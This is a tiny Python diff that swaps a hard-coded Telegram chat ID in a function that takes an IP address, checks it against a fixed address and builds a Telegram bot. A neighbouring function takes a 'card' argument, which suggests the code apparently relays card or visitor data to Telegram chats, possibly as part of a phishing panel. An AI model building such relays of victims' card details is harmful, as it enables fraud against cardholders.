@@ -67,7 +67,7 @@ def ne_pizdabol(card, chat_id='-4150791967'):
 
 def cheltut(ip: str):
     try:
-        chat_id='-4236427099'
+        chat_id='-4150791967'
         if ip.find('176.101.2.213') != -1:
             pass
         bot = Bot(token=API_TOKEN)
